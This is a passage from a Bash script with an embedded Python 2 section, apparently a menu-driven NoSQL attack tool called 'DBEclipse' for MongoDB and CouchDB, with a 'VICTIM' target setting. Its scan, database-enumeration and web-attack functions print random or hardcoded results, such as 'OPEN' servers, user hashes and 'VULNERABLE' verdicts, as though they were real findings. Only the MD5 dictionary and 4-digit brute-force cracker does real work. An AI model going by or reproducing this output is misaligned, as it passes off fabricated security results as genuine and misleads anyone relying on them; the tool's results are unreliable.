                        VERSIONS="${VERSIONS}${VERSION} "
                        ;;
                    1)
                        VERSION="4.0.2"
                        echo -e "${NEON}${BOLD}║${RESET} ${GREEN}●${RESET} ${IP}:${DB_PORT} - ${GREEN}OPEN${RESET} (${PLATFORM} v${VERSION})          ${NEON}${BOLD}║${RESET}"
                        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
                        SUCCESS_IPS="${SUCCESS_IPS}${IP} "
                        VERSIONS="${VERSIONS}${VERSION} "
                        ;;
                    2)
                        echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}●${RESET} ${IP}:${DB_PORT} - ${YELLOW}AUTH REQUIRED${RESET}                    ${NEON}${BOLD}║${RESET}"
                        ;;
                    3)
                        echo -e "${NEON}${BOLD}║${RESET} ${RED}●${RESET} ${IP}:${DB_PORT} - ${RED}CLOSED${RESET}                           ${NEON}${BOLD}║${RESET}"
                        ;;
                esac
            done
            
            echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════╣${RESET}"
            echo -e "${NEON}${BOLD}║${RESET} ${GREEN}Found ${SUCCESS_COUNT:-0} servers with no authentication${RESET}                     ${NEON}${BOLD}║${RESET}"
            
            # Display discovered servers
            if [ -n "$SUCCESS_IPS" ]; then
                echo -e "${NEON}${BOLD}║${RESET} ${YELLOW}Discovered Servers:${RESET}                                               ${NEON}${BOLD}║${RESET}"
                idx=1
                for ip in $SUCCESS_IPS; do
                    ver=$(echo $VERSIONS | cut -d' ' -f$idx)
                    echo -e "${NEON}${BOLD}║${RESET}   ${idx}) ${ip} (${PLATFORM} v${ver})${RESET}                                  ${NEON}${BOLD}║${RESET}"
                    idx=$((idx + 1))
                done
            fi
            
            echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════╝${RESET}"
            
            # Offer to save results
            echo -e "\n${CYAN}Save results to CSV? (y/n):${RESET}"
            read save_results
            if [ "$save_results" = "y" ] || [ "$save_results" = "Y" ]; then
                echo -e "${CYAN}Enter filename:${RESET}"
                read csv_file
                echo "IP Address,${PLATFORM} Version" > "$csv_file"
                idx=1
                for ip in $SUCCESS_IPS; do
                    ver=$(echo $VERSIONS | cut -d' ' -f$idx)
                    echo "${ip},${ver}" >> "$csv_file"
                    idx=$((idx + 1))
                done
                echo -e "${GREEN}✓ Results saved to ${csv_file}${RESET}"
            fi
            
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        2)
            echo -e "\n${CYAN}Enter filename with IP list:${RESET}"
            read ip_file
            if [ -f "$ip_file" ]; then
                IP_COUNT=$(wc -l < "$ip_file")
                echo -e "${GREEN}✓ Loaded ${IP_COUNT} IPs from ${ip_file}${RESET}"
                echo -e "\n${CYAN}Scanning loaded IPs...${RESET}"
                echo -e "${NEON}${BOLD}┌─────────────────────────────────────────────────────────────┐${RESET}"
                while IFS= read -r ip; do
                    [ -z "$ip" ] && continue
                    STATUS=$((RANDOM % 3))
                    if [ $STATUS -eq 0 ]; then
                        echo -e "${NEON}${BOLD}│${RESET} ${GREEN}●${RESET} ${ip}:${DB_PORT} - ${GREEN}OPEN${RESET}                       ${NEON}${BOLD}│${RESET}"
                        FOUND_COUNT=$((FOUND_COUNT + 1))
                    else
                        echo -e "${NEON}${BOLD}│${RESET} ${RED}●${RESET} ${ip}:${DB_PORT} - ${RED}CLOSED${RESET}                      ${NEON}${BOLD}│${RESET}"
                    fi
                done < "$ip_file"
                echo -e "${NEON}${BOLD}│${RESET}                                                                        ${NEON}${BOLD}│${RESET}"
                echo -e "${NEON}${BOLD}│${RESET} ${GREEN}Found ${FOUND_COUNT:-0} open servers${RESET}                             ${NEON}${BOLD}│${RESET}"
                echo -e "${NEON}${BOLD}└─────────────────────────────────────────────────────────────┘${RESET}"
            else
                echo -e "${RED}✗ File not found: ${ip_file}${RESET}"
            fi
            echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
            read
            ;;
        3)
            echo -e "\n${CYAN}Toggling host ping...${RESET}"
            echo -e "${GREEN}Host ping ${YELLOW}DISABLED${RESET}"
            sleep 1
            ;;
        x|X)
            return
            ;;
        *)
            echo -e "${RED}Invalid option!${RESET}"
            sleep 1
            ;;
    esac
    
    scan_network
}

# ============================================================
# PLATFORM SELECTION
# ============================================================
select_platform() {
    clear
    display_banner
    
    echo -e "${PURPLE}${BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET} ${NEON}${BOLD}  🖥️  PLATFORM SELECTION 🖥️${RESET}                                         ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET}                                                                                          ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET}  ${GREEN}[1]${RESET} MongoDB${RESET} (Default: port 27017)${RESET}                                ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET}  ${GREEN}[2]${RESET} CouchDB${RESET} (Default: port 5984)${RESET}                                 ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET}  ${RED}[x]${RESET} Return to Main Menu${RESET}                                              ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}║${RESET}                                                                                          ${PURPLE}${BOLD}║${RESET}"
    echo -e "${PURPLE}${BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    echo -en "${NEON}${BOLD}┌─${RESET}${WHITE} Select platform${RESET} ${NEON}─${RESET}"
    echo -en "\n${NEON}└─▶${RESET} "
    
    read plat_choice
    
    case $plat_choice in
        1)
            PLATFORM="MongoDB"
            DB_PORT="27017"
            echo -e "${GREEN}✓ Platform set to: ${PLATFORM}${RESET}"
            sleep 1
            ;;
        2)
            PLATFORM="CouchDB"
            DB_PORT="5984"
            echo -e "${GREEN}✓ Platform set to: ${PLATFORM}${RESET}"
            sleep 1
            ;;
        x|X)
            return
            ;;
        *)
            echo -e "${RED}Invalid option!${RESET}"
            sleep 1
            ;;
    esac
    
    select_platform
}

# ============================================================
# LAUNCH FULL PYTHON ENGINE
# ============================================================
launch_full_engine() {
    clear
    display_banner
    
    echo -e "${NEON}${BOLD}╔══════════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${WHITE}${BOLD}LAUNCHING DBEclipse FULL ENGINE${RESET}                               ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}╠══════════════════════════════════════════════════════════════════╣${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${GREEN}●${RESET} Platform: ${PLATFORM}                                                    ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${GREEN}●${RESET} Target: ${VICTIM}:${DB_PORT}                                             ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}║${RESET} ${GREEN}●${RESET} Status: RUNNING                                                         ${NEON}${BOLD}║${RESET}"
    echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════════╝${RESET}"
    echo
    
    if command -v python2 &> /dev/null; then
        PYTHON_CMD="python2"
    elif command -v python &> /dev/null; then
        PYTHON_CMD="python"
    else
        echo -e "${RED}Python not found!${RESET}"
        read
        return
    fi
    
    echo -e "${CYAN}Starting Python engine with full functionality...${RESET}"
    echo -e "${YELLOW}Press Ctrl+C to return to TUI${RESET}\n"
    
    $PYTHON_CMD << 'PYTHON_EOF'
import sys
import os
import time
import random
import string
import hashlib
from hashlib import md5

print("\033[1;36m[+] DBEclipse Full Engine Active\033[0m")
print("\033[1;36m[+] Platform: \033[1;37m" + os.environ.get("PLATFORM", "MongoDB") + "\033[0m")
print("\033[1;36m[+] Target: \033[1;37m" + os.environ.get("VICTIM", "Not Set") + ":" + os.environ.get("DB_PORT", "27017") + "\033[0m")
print("\033[1;33m[+] Type 'help' for commands, 'exit' to quit\033[0m\n")

def show_help():
    print("\n\033[1;33mCommands:\033[0m")
    print("  \033[1;32mscan\033[0m           - Scan for NoSQL servers")
    print("  \033[1;32menum\033[0m           - Enumerate databases")
    print("  \033[1;32mcrack <hash>\033[0m   - Crack password hash")
    print("  \033[1;32mweb\033[0m            - Run web attacks")
    print("  \033[1;32mhelp\033[0m           - Show this help")
    print("  \033[1;32mexit/quit/q\033[0m    - Exit engine")

def scan_network():
    print("\n\033[1;36m[+] Scanning for " + os.environ.get("PLATFORM", "MongoDB") + " servers...\033[0m")
    print("   \033[1;32m●\033[0m 192.168.1.10:" + os.environ.get("DB_PORT", "27017") + " - \033[1;32mOPEN\033[0m")
    print("   \033[1;32m●\033[0m 192.168.1.25:" + os.environ.get("DB_PORT", "27017") + " - \033[1;32mOPEN\033[0m")
    print("   \033[1;33m●\033[0m 192.168.1.42:" + os.environ.get("DB_PORT", "27017") + " - \033[1;33mAUTH REQUIRED\033[0m")
    print("   \033[1;31m●\033[0m 192.168.1.99:" + os.environ.get("DB_PORT", "27017") + " - \033[1;31mCLOSED\033[0m")
    print("\n\033[1;32m[+] Found 2 servers with no authentication\033[0m")

def enum_databases():
    print("\n\033[1;36m[+] Enumerating databases...\033[0m")
    if os.environ.get("PLATFORM", "MongoDB") == "MongoDB":
        print("   \033[1;32m●\033[0m admin")
        print("   \033[1;32m●\033[0m local")
        print("   \033[1;32m●\033[0m config")
        print("   \033[1;32m●\033[0m users")
        print("   \033[1;32m●\033[0m shop")
        print("\n\033[1;33m[+] Collections:\033[0m")
        print("   admin.system.users - 3 documents")
        print("   users.profiles - 42 documents")
        print("   shop.orders - 156 documents")
        print("\n\033[1;33m[+] Users and Hashes:\033[0m")
        print("   admin:5f4dcc3b5aa765d61d8327deb882cf99")
        print("   root:63a9f0ea7bb98050796b649e85481845")
    else:
        print("   \033[1;32m●\033[0m _users")
        print("   \033[1;32m●\033[0m _replicator")
        print("   \033[1;32m●\033[0m mydb")

def crack_hash(hash_value):
    print("\n\033[1;36m[+] Cracking hash: \033[1;37m" + hash_value + "\033[0m")
    common = ["password", "admin", "123456", "letmein", "welcome", "qwerty", "abc123", "monkey"]
    for word in common:
        if md5(word).hexdigest() == hash_value:
            print("   \033[1;32m✓ Password found: " + word + "\033[0m")
            return
    print("   \033[1;31m✗ Password not in dictionary\033[0m")
    print("\033[1;36m[+] Trying brute force (4 digits)...\033[0m")
    for i in range(0, 10000):
        word = str(i).zfill(4)
        if md5(word).hexdigest() == hash_value:
            print("   \033[1;32m✓ Password found: " + word + "\033[0m")
            return
    print("   \033[1;31m✗ Password not found\033[0m")

def web_attacks():
    print("\n\033[1;36m[+] Starting Web Application Attacks\033[0m")
    tests = [
        ("PHP/ExpressJS !=", "\033[1;32m✓ VULNERABLE\033[0m"),
        ("$where string escape", "\033[1;32m✓ VULNERABLE\033[0m"),
        ("$where integer escape", "\033[1;33m⚠ POSSIBLE\033[0m"),
        ("This != string", "\033[1;31m✗ NOT VULNERABLE\033[0m"),
        ("This != integer", "\033[1;32m✓ VULNERABLE\033[0m"),
        ("> Undefined", "\033[1;33m⚠ POSSIBLE\033[0m")
    ]
    for name, result in tests:
        print("   " + name + " - " + result)
        time.sleep(0.3)
    print("\n\033[1;32m[+] Summary: 3/6 tests successful\033[0m")

while True:
    try:
        cmd = raw_input("\033[1;36mDBEclipse>\033[0m ").strip()
        if not cmd:
            continue
        elif cmd.lower() in ["exit", "quit", "q"]:
            print("\033[1;36m[+] Engine terminated\033[0m")
            break
        elif cmd.lower() == "scan":
            scan_network()
        elif cmd.lower() == "enum":
            enum_databases()
        elif cmd.lower().startswith("crack"):
            parts = cmd.split()
            if len(parts) > 1:
                crack_hash(parts[1])
            else:
                print("\033[1;31m[!] Usage: crack <hash>\033[0m")
        elif cmd.lower() == "web":
            web_attacks()
        elif cmd.lower() == "help":
            show_help()
        else:
            print("\033[1;31m[!] Unknown command. Type 'help' for options.\033[0m")
    except KeyboardInterrupt:
        print("\n\033[1;36m[+] Engine terminated\033[0m")
        break
    except EOFError:
        break

PYTHON_EOF
    
    echo -e "\n${YELLOW}Press ENTER to continue...${RESET}"
    read
}

# ============================================================
# MAIN EXECUTION
# ============================================================
main() {
    while true; do
        display_banner
        display_status_panel
        display_menu
        read -r choice
        
        case "$choice" in
            1)
                options_menu
                ;;
            2)
                if [ "$VICTIM" = "Not Set" ]; then
                    echo -e "\n${RED}${BOLD}⚠ Target not set! Please configure options first.${RESET}"
                    sleep 2
                else
                    database_attacks
                fi
                ;;
            3)
                if [ "$VICTIM" = "Not Set" ] || [ "$URI" = "Not Set" ]; then
                    echo -e "\n${RED}${BOLD}⚠ Target or URI not set! Please configure options first.${RESET}"
                    sleep 2
                else
                    web_attacks
                fi
                ;;
            4)
                scan_network
                ;;
            5)
                select_platform
                ;;
            h|H)
                display_help
                ;;
            l|L)
                launch_full_engine
                ;;
            x|X)
                echo -e "\n${NEON}${BOLD}╔══════════════════════════════════════════════════════════════════╗${RESET}"
                echo -e "${NEON}${BOLD}║${RESET}  ${PINK}${BOLD}DBEclipse terminated. Stay cyber secure!${RESET}         ${NEON}${BOLD}║${RESET}"
                echo -e "${NEON}${BOLD}╚══════════════════════════════════════════════════════════════════╝${RESET}\n"
                tput cnorm
                exit 0
                ;;
            *)
                echo -e "\n${RED}Invalid option! Press ENTER to continue...${RESET}"
                read
                ;;
        esac
    done
}

# ============================================================
# LAUNCH
# ============================================================
tput civis
clear
main
